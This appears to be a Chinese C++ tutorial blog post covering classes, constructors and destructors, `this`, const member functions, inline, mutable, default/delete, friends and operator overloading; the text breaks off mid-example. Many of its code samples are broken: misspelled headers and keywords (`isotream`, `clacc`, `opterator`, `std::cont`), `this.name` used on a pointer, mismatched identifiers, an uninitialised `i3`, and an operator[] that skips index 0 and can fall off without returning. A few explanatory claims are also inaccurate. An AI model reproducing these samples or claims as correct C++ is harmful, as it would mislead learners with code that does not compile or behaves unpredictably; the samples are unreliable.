<p>在类的内部（定义类的代码内部），无论成员被声明为 public、protected 还是 private，都是可以互相访问的，没有访问权限的限制。在类的外部（定义类的代码之外），只能通过对象访问成员，并且通过对象只能访问 public 属性的成员，不能访问 private、protected 属性的成员。</p>
<h2 id="类介绍，构造函数，析构函数"><a href="#类介绍，构造函数，析构函数" class="headerlink" title="(*)类介绍，构造函数，析构函数"></a>(*)类介绍，构造函数，析构函数</h2><p><strong>1.类介绍：</strong></p>
<p>(1) 对面向对象和面向过程的理解</p>
<p>① 面向对象和面向过程是一个相对的概念。</p>
<p>② 面向过程是按照计算机的工作逻辑来编码的方式，最典型的面向过程的语言就是c语言了，c语言直接对应汇编，汇编又对应电路。</p>
<p>③ 面向对象则是按照人类的思维来编码的一种方式，C++就完全支持面向对象功能，可以按照人类的思维来处理问题。</p>
<p>④ 举个例子，要把大象装冰箱，按照人类的思路自然是分三步，打开冰箱，将大象装进去，关上冰箱。</p>
<p>要实现这三步，我们就要首先有人，冰箱这两个对象。人有给冰箱发指令的能	力，冰箱有能够接受指令并打开或关闭门的能力。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//c++</span></span><br><span class="line"><span class="meta">#inlcude<span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IceChest</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">openIceChest</span><span class="params">(<span class="type">const</span> IceChest&amp; iceChest)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IceChest</span>:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">openDoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">closeDoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//c语言</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">IceChest</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">personOpenIceChest</span><span class="params">(<span class="type">const</span> Person&amp; person,<span class="type">const</span> IceChest&amp; iceChest)</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">personCloseIceChest</span><span class="params">(<span class="type">const</span> Person&amp; person,<span class="type">const</span> IceChest&amp; iceChest)</span></span></span><br></pre></td></tr></table></figure>

<p>但是从计算机的角度讲，计算机只能定义一个叫做人和冰箱的结构体。人有手这个部位，冰箱有门这个部位。然后从天而降一个函数，是这个函数让手打开了冰箱，又是另一个函数让大象进去，再是另一个函数让冰箱门关上。</p>
<p> 从开发者的角度讲，面向对象显然更利于程序设计。用面向过程的开发方式，程序一旦大了，各种从天而降的函数会非常繁琐，一些用纯c写的大型程序，实际上也是模拟了面向对象的方式。</p>
<p> 那么，如何用面向过程的c语言模拟出面向对象的能力呢？类就诞生了，在类中可以定义专属于类的函数，让类有了自己的动作。回到那个例子，人的类有了让冰箱开门的能力，冰箱有了让人打开的能力，不再需要天降神秘力量了，hh</p>
<p> <strong>2.构造函数</strong></p>
<p> 类是通过面向过程的机器实现的，类相当于定义了一个新类型，该类型生成在堆或栈上的对象时内存排布和c语言相同。但是c++规定，<strong>C++有在类对象创建时就在对应内存将数据初始化的能力</strong>，这就是构造函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;isotream&gt;</span></span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">CPPtest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CPPTest</span>(<span class="type">int</span> i_,<span class="type">int</span> i2_) :<span class="built_in">i</span>(i_),<span class="built_in">i2</span>(i2_)&#123;&#125;<span class="comment">//c++可以在类中构造函数，将参数对应内存初始化;若没有，则自动生成，但是没什么用</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> i2;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">CPPtest <span class="title">cppTest</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>)</span></span>;<span class="comment">//初始化i,i2</span></span><br><span class="line">    std::cout&lt;&lt;cppTest.i&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;cppTest.i2&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>构造函数有以下类型。</p>
<ol>
<li><p>普通构造函数</p>
</li>
<li><p>复制构造函数：用另一个对象来初始化对象对应的内存</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CPPTest</span>(<span class="type">const</span> CPPTest&amp; cppTest) :<span class="built_in">i</span>(cppTest.i), <span class="built_in">i2</span>(cppTest.i2)&#123;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>移动构造函数：也是用另一个对象来初始化对象，具体内容会在Part3第13节详细讲解。</p>
</li>
<li><p>默认构造函数：当类没有任何构造函数时，编译期会为该类生成一个默认的的构造函数，在最普通的类中，默认构造函数什么都没做，对象对应的内存没有被初始化。</p>
</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CPPTest</span>()&#123;&#125;;<span class="comment">//作用和构造函数一样</span></span><br></pre></td></tr></table></figure>

<p>构造函数就是C++提供的<strong>必须有的</strong>在对象创建时初始化对象的方法，（默认的什么都不做也是一种初始化的方式）</p>
<p><strong>3.析构函数</strong></p>
<p>介绍:</p>
<p>类对象被销毁时，就会调用析构函数。栈上对象的销毁时机就是函数栈销毁时,堆上的对象销毁时机就是该堆内存被手动释放时，如果用new申请的这块堆内存，那调用delete销毁这块内存时就会调用析构函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;isotream&gt;</span></span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">CPPTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CPPTest</span>(<span class="type">int</span> i_,<span class="type">int</span> i2_) :<span class="built_in">i</span>(i_),<span class="built_in">i2</span>(i2_)&#123;&#125;</span><br><span class="line">    <span class="built_in">CPPTest</span>(<span class="type">const</span> CPPTest&amp; cppTest) :<span class="built_in">i</span>(cppTest.i), <span class="built_in">i2</span>(cppTest.i2)&#123;&#125;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> i2;</span><br><span class="line">    ~<span class="built_in">CPPTest</span>()<span class="comment">//如没有会自动添加</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">CPPTest <span class="title">cppTest</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>)</span></span>;<span class="comment">//初始化i,i2</span></span><br><span class="line">    std::cout&lt;&lt;cppTest.i&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;cppTest.i2&lt;&lt;std::endl;</span><br><span class="line">    CPPTest* pCppTest=<span class="keyword">new</span> <span class="built_in">CppTest</span>(<span class="number">1.2</span>);<span class="comment">//调用在堆上，自动销毁</span></span><br><span class="line">    <span class="keyword">delete</span> PCppTest;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是再某些情况下，析构函数必须要干活</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;isotream&gt;</span></span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">CPPTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CPPTest</span>(<span class="type">int</span> i_,<span class="type">int</span> i2_) :<span class="built_in">i</span>(i_),<span class="built_in">i2</span>(i2_),<span class="built_in">pi</span>(<span class="keyword">new</span> <span class="built_in">int</span>(i3))&#123;&#125;</span><br><span class="line">    <span class="built_in">CPPTest</span>(<span class="type">const</span> CPPTest&amp; cppTest) :<span class="built_in">i</span>(cppTest.i), <span class="built_in">i2</span>(cppTest.i2),<span class="built_in">pi</span>(<span class="keyword">new</span> <span class="built_in">int</span>(*cppTest.pi))&#123;&#125;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> i2;</span><br><span class="line">    <span class="type">int</span> *pi;</span><br><span class="line">    ~<span class="built_in">CPPTest</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">delete</span> pi;</span><br><span class="line">    &#125;<span class="comment">//当栈上pi指向堆上的i3，如果析构函数中没有delete，那么只会把栈上的释放，堆上的数据没有释放，会造成内存泄漏</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结，当类对象销毁时有一些我们必须手动操作的步骤时，析构函数就派上了用场。所以，几乎所有的类我们都要写构造函数，析构函数却未必需要</p>
<h2 id="this-常成员函数与常对象"><a href="#this-常成员函数与常对象" class="headerlink" title="(*)this,常成员函数与常对象"></a>(*)this,常成员函数与常对象</h2><p><strong>1.this关键字：</strong></p>
<p>(1) this是什么：</p>
<p>① 编译器将this解释为指向函数所作用的对象的指针，这句话新手有些不好理解，用代码演示一下就好说了。C++类的本质就是C语言的结构体外加几个类外的函数，C++最后都要转化为C语言来实现，类外的函数就是通过this来指向这个类的。</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">clacc Test</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">       <span class="built_in">Test</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">unsigned</span> old_);</span><br><span class="line">       ~<span class="built_in">Test</span>();</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">output</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;name=&quot;</span>&lt;&lt;<span class="keyword">this</span>-&gt;name&lt;&lt;<span class="string">&quot;     old=&quot;</span>&lt;&lt;<span class="keyword">this</span>-&gt;old&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">       std::string name;</span><br><span class="line">       <span class="type">unsigned</span> old;</span><br><span class="line">&#125;;</span><br><span class="line">Test::<span class="built_in">Test</span>(<span class="type">const</span> std::string&amp; name_,<span class="type">unsigned</span> old_):<span class="built_in">name</span>(name_),<span class="built_in">old</span>(old_)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">Test::~<span class="built_in">Test</span>()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Test <span class="title">test</span><span class="params">(<span class="string">&quot;fanfan&quot;</span>,<span class="number">20</span>)</span></span>;</span><br><span class="line">    test.<span class="built_in">outPut</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>② 当然，这么说并非完全准确，this是一个关键字，只是我们将它当做指针理解罢了。</p>
<p> this有很多功能是单纯的指针无法满足的。比如每个类函数的参数根本没有名叫this的指针。这不过是编译器赋予的功能罢了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">clacc Test</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">       <span class="built_in">Test</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">unsigned</span> old_);</span><br><span class="line">       ~<span class="built_in">Test</span>();</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">output</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;name=&quot;</span>&lt;&lt;<span class="keyword">this</span>.name&lt;&lt;<span class="string">&quot;     old=&quot;</span>&lt;&lt;<span class="keyword">this</span>.old&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">       std::string name;</span><br><span class="line">       <span class="type">unsigned</span> old;</span><br><span class="line">&#125;;</span><br><span class="line">Test::<span class="built_in">Test</span>(<span class="type">const</span> std::string&amp; name_,<span class="type">unsigned</span> old_):<span class="built_in">name</span>(name_),<span class="built_in">old</span>(old_)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">Test::~<span class="built_in">Test</span>()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">void</span> (Test::* pf)()=&amp;Test::output;<span class="comment">//空参数的指针能指向类的成员函数，说明类中没有this这个形参变量</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Test <span class="title">test</span><span class="params">(<span class="string">&quot;fanfan&quot;</span>,<span class="number">20</span>)</span></span>;</span><br><span class="line">    (test.*pf)();<span class="comment">//结果一样</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.常成员函数和常对象</strong></p>
<p>某位大佬说：“常成员函数和常对象很多人并不在意，确实，都写普通变量也可以。但是，我还是要提一点，在大型程序中，尽量加上const关键字可以减少很多不必要的错误。<strong>这一点，开发过大型程序的人应该深有体会，没开发过大型程序的人也不必在意，记住多用const，这是一个很好的习惯</strong>。“</p>
<p>(1) 常成员函数就是无法修改成员变量的函数。可以理解为将this指针指向对象用const修饰的函数。(例子在本节的第一个代码演示)</p>
<p>常对象就是用const修饰的对象，定义好之后就再也不需要更改成员变量的值了。</p>
<p>(2) 常成员函数注意事项：</p>
<p>因为类的成员函数已经将this指针省略了，只能在函数后面加const关键字来实现无法修改类成员变量的功能了</p>
<p>① 注意：常函数无法调用了普通函数，无意义。</p>
<p><strong>②</strong> <strong>成员函数能写作常成员函数就尽量写作常成员函数，可以减少出错几率。</strong></p>
<p>③ 同名的常成员函数和普通成员函数是可以重载的，常量对象会优先调用常成员函数，普通对象会优先调用普通成员函数。</p>
<p>(3) 常对象注意事项：</p>
<p>① 常对象不能调用普通函数</p>
<p>② 常函数在大型程序中真的很重要，很多时候我们都需要创建好就不再改变的对象</p>
<p><strong>大佬强调：常对象和常函数要多用</strong></p>
<h2 id="inline，mutable，default，delete"><a href="#inline，mutable，default，delete" class="headerlink" title="inline，mutable，default，delete"></a><strong>inline，mutable，default，delete</strong></h2><p>inline,mutable知道就行，default和delete需要掌握</p>
<p><strong>1.inline关键字</strong></p>
<p>(1) inline关键字的有什么作用：</p>
<p>① 在函数声明或定义中函数返回类型前加上关键字inline就可以把函数指定为<strong>内联函数</strong>。关键字inline必须与函数定义放在一起才能使函数成为内联，仅仅将inline放在函数声明前不起任何作用。</p>
<p> ② 内联函数的作用，普通函数在调用时需要给函数分配栈空间以供函数执行，压栈等操作会影响成员运行效率，于是C++提供了<strong>内联函数将函数体放到需要调用函数的地方</strong>，用空间换效率。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">public</span>:  </span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">outPut</span><span class="params">()</span></span>;<span class="comment">//默认有inline，后边的不加，这里加了也是无效的</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">Test::outPut</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;hello world&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    test.<span class="built_in">outPut</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> (2) inline关键字的注意事项：inline关键字只是一个建议，开发者建议编译器将成员函数当做内联函数，一般适合搞内联的情况编译器都会采纳建议。（牺牲空间换取时间）</p>
<p> (3) **总结:**使用inline关键字就是一种提高效率，但加大编译后文件大小的方式，现在随着硬件性能的提高，inline关键字用的越来越少了。</p>
<p><strong>2.mutable关键字</strong></p>
<p>(1) mutable关键字的作用：</p>
<p>① Mutable意为可变的，与const相对，被mutable修饰的成员变量，永远处于可变的状态，即便处于一个常函数中，该变量也可以被更改。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">outPut</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    <span class="keyword">mutable</span> <span class="type">unsigned</span> outPutCallCount=<span class="number">0</span>;</span><br><span class="line">   &#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Test::outPut</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ++outPutCallCount;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;hello world&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    test.<span class="built_in">outPut</span>();</span><br><span class="line">    std::cout&lt;&lt;test.outPutCallCount&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个关键字在现代C++中使用情况并不多，一般来说只有在统计函数调用次数时才会用到。</p>
<p> (2) mutable关键字的注意事项</p>
<p>① mutable是一种万不得已的写法，一个程序不得不使用mutable关键字时，可以认为这部分程序是一个糟糕的设计。</p>
<p>② mutable不能修饰<strong>静态成员变量和常成员变量</strong>。</p>
<p>(3) <strong>总结：</strong>mutable关键字是一种没有办法的办法，设计时应该尽量避免，只有在统计函数调用次数这类情况下才推荐使用。</p>
<p><strong>3.default关键字</strong></p>
<p>(1) default关键字的作用：</p>
<p>① 在编译时不会生成默认构造函数时便于书写。</p>
<p>② 也可以对默认复制构造函数，默认的赋值运算符和默认的析构函数使用，表示使用的是系统默认提供的函数，这样可以使代码更加明显。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">Test</span>(<span class="type">unsigned</span> old_):<span class="built_in">old</span>(old_)&#123;&#125;</span><br><span class="line">    <span class="built_in">Test</span>() = <span class="keyword">default</span>;<span class="comment">//以前Test()&#123;&#125;</span></span><br><span class="line">	<span class="built_in">Test</span>(<span class="type">const</span> Test&amp; test)=<span class="keyword">default</span>;<span class="comment">//使用系统默认</span></span><br><span class="line">    Test&amp; <span class="keyword">operator</span>=(<span class="type">const</span> Test&amp; test)=<span class="keyword">default</span>;</span><br><span class="line">    ~<span class="built_in">Test</span>()=<span class="keyword">default</span>;</span><br><span class="line">	<span class="type">unsigned</span> old;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>③</strong> 现代C++中，哪怕没有构造函数，也推荐将构造函数用default关键字标记，可以让代码看起来更加直观，方便。</p>
<p>总结：default关键字还是推荐使用的，在现代C++代码中，如果需要使用一些默认的函数，推荐用default标记出来。</p>
<p><strong>4.delete关键字</strong></p>
<p>(1) Delete关键字的作用：C++会为程序生成默认构造函数，默认复制构造函数，默认重载赋值运算符。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//没有Test(unsigned old_):old(old_)&#123;&#125;，还不想默认生成</span></span><br><span class="line">    <span class="built_in">Test</span>()=<span class="keyword">delete</span>；</span><br><span class="line">    <span class="comment">//Test&amp; operator=(const Test&amp; test)=default;使用系统默认，不想使用就将default换成delete</span></span><br><span class="line">    ~<span class="built_in">Test</span>()=<span class="keyword">default</span>;<span class="comment">//一般不会delete</span></span><br><span class="line">	<span class="type">unsigned</span> old;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p> 在很多情况下，我们并不希望这些默认的函数被生成，在C++11以前，只能有将此函数声明为私有函数或是将函数只声明不定义两种方式。</p>
<p> C++11于是提供了delete关键字，只要在函数最后加上“&#x3D;delete”就可以明确告诉编译期不要默认生成该函数。</p>
<p> 总结：delete关键字还是推荐使用的，在现代C++代码中，如果不希望一些函数默认生成，就用delete表示，这个功能还是很有用的，比如在单例模式中。</p>
<h2 id="友元类和友元函数"><a href="#友元类和友元函数" class="headerlink" title="友元类和友元函数"></a>友元类和友元函数</h2><p>**1.**介绍：友元就是可以让另一个类或函数访问私有成员的简单写法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">Test2</span>;<span class="comment">//友元类</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">outPut</span><span class="params">(<span class="type">const</span> Test&amp; test)</span></span>;<span class="comment">//友元函数</span></span><br><span class="line"> <span class="keyword">private</span>:   </span><br><span class="line">    std::string name;</span><br><span class="line">    <span class="type">unsigned</span> old;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test2</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">outPut</span><span class="params">(<span class="type">const</span> Test&amp; test)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cont&lt;&lt;test.name&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;test.old&lt;&lt;std::endl;<span class="comment">//没有friend，类不能访问Test中的变量</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="function"><span class="type">void</span> <span class="title">outPut</span><span class="params">(<span class="type">const</span> Test&amp; test)</span><span class="comment">//上接友元函数</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cont&lt;&lt;test.name&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;test.old&lt;&lt;std::endl;<span class="comment">//没有friend，函数不能访问Test中的变量</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> **2.**注意：</p>
<p>(1) 友元会破坏<strong>封装性</strong>，一般不推荐使用，所带来的方便写几个接口函数就解决了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">std::string <span class="title">getName</span><span class="params">()</span><span class="type">const</span></span>&#123;<span class="keyword">return</span> name;&#125;;<span class="comment">//</span></span><br><span class="line">    <span class="function"><span class="type">unsigned</span> <span class="title">getOld</span><span class="params">()</span><span class="type">const</span></span>&#123;<span class="keyword">return</span> old;&#125;;<span class="comment">//接口</span></span><br><span class="line"> <span class="keyword">private</span>:  </span><br><span class="line">    std::string name;</span><br><span class="line">    <span class="type">unsigned</span> old;</span><br><span class="line">&#125;<span class="comment">//同样效果</span></span><br></pre></td></tr></table></figure>

<p><strong>(2)</strong> 某些运算符的<strong>重载</strong>必须用到友元的功能，这才是友元的真正用途。</p>
<p> **3.**大佬说：友元平常并不推荐使用，新手不要再纠结友元的语法了，只要可以用友元写出必须用友元的重载运算符就可以了。</p>
<h2 id="重载运算符"><a href="#重载运算符" class="headerlink" title="(**)重载运算符"></a>(**)重载运算符</h2><p><strong>重载运算符在整个C++中拥有非常重要的地位</strong></p>
<p><strong>1.重载运算符的作用：</strong></p>
<p>(1) 很多时候我们想让类对象也能像基础类型的对象一样进行作基础操作，比如“+”，“-”，“*”，“\”，也可以使用某些运算符“&#x3D;”，“()”，“[]”,“&lt;&lt;”，“&gt;&gt;”。但是一般的类即使编译器可以识别这些运算符，类对象也无法对这些运算符做出应对，我们必须对类对象定义处理这些运算符的方式。</p>
<p>(2) C++提供了定义这些行为的方式，就是<strong>operator 运算符</strong>来定义运算符的行为，operator是一个关键字，告诉编译器我要重载运算符了。</p>
<p> <strong>2.注意：</strong></p>
<p>(1) 我们只能重载C++已有的运算符，所有无法将“<strong>”这个运算符定义为指数的形式，因为C++根本没有“</strong>”这个运算符。</p>
<p>(2) C++重载运算符不能改变运算符的<strong>元数</strong>，“元数”这个概念就是指一个运算符对应的对象数量，比如“+”必须为“a + b”，也就是说“+”必须有两个对象，那么“+”就是二元运算符。比如“++”运算符，必须写为“a++”，也就是一元运算符。</p>
<p> <strong>3.重载运算符举例</strong></p>
<p>(1) 一元运算符重载</p>
<p>① “++”，“–”</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iosteam&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">void</span> opterator++()</span><br><span class="line">    &#123;</span><br><span class="line">        ++count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">void</span> opterator--()</span><br><span class="line">    &#123;</span><br><span class="line">        --count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> count = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    ++test;</span><br><span class="line">    std::cout&lt;&lt;test.count&lt;&lt;std::endl;</span><br><span class="line">    --test;</span><br><span class="line">    std::cout&lt;&lt;test.count&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>② “[]”</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iosteam&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span><span class="comment">//容器</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> <span class="keyword">operator</span>[](<span class="type">unsigned</span> i)<span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">0</span>&amp;&amp;i&lt;ivec.size)</span><br><span class="line">            <span class="keyword">return</span> ivec[i];</span><br><span class="line">    &#125;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; ivec&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span 